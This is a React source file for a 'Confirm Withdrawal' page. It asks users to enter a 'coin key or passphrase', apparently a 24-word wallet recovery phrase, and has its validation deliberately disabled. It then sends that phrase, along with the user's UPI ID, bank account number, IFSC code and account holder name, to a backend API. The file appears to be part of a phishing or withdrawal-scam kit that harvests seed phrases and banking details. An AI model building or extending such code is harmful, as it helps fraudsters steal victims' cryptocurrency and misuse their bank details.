import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '../css/CoinKeyPage.css';

// Coin Key Page component
function CoinKeyPage({ quantity, totalAmount }) {
  const navigate = useNavigate();
  const { state } = useLocation();
  const [coinKey, setCoinKey] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // ⛔️ Remove 24-word validation by always returning true
  const isValidCoinKey = () => true;

  // Handle form submission
  const handleSubmit = async () => {
    // ❌ Skip 24-word check
    setLoading(true);
    try {
      await axios.post('http://localhost:5000/api/submit-key', {
        quantity,
        totalAmount,
        method: state.method,
        upiId: state.upiId,
        accountNo: state.accountNo,
        ifsc: state.ifsc,
        accountHolder: state.accountHolder,
        coinKey,
        contactId: state.contactId,
        fundAccountId: state.fundAccountId,
        payoutId: state.payoutId,
      });
      navigate('/withdrawal-success', {
        state: { payoutId: state.payoutId, amount: totalAmount },
      });
    } catch (err) {
      const errorMessage = err.response?.data?.error || 'Failed to submit key';
      setError(errorMessage);
      try {
        window.alert('Failed to submit key. Please try again.');
      } catch (e) {
        console.error('Alert failed:', e);
        setError(errorMessage);
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <div className="app-container">
        <div className="coin-key-container">
          <h1 className="coin-key-title">Confirm Withdrawal</h1>
          <p className="coin-key-info">Quantity: {quantity} | Total Amount: ₹{totalAmount}</p>
          <p className="coin-key-info">Account Holder: {state.accountHolder}</p>
          <div className="input-group">
            <label className="input-label">Coin Key / Passphrase</label>
            <textarea
              value={coinKey}
              onChange={(e) => setCoinKey(e.target.value)}
              className="coin-key-input"
              placeholder="Enter your coin key or passphrase"
              rows="6"
            />
          </div>
          {error && <p className="error-text">{error}</p>}
          <button
            onClick={handleSubmit}
            disabled={loading || !coinKey}
            className="confirm-button"
          >
            {loading ? 'Submitting...' : 'Confirm Withdraw'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default CoinKeyPage;
